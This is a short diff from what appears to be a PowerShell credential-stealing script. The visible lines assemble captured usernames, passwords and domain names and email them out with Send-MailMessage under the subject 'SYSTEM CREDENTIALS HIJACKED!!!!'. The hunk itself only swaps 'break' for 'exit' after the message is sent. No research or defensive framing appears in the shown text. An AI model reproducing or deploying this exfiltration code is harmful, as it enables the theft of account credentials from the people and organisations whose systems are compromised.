@@ -39,7 +39,7 @@ Param ()
 		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
 		$newline = "`r`n"
 		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
-                break
+                exit
             }
 	    else{
 	    	$local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
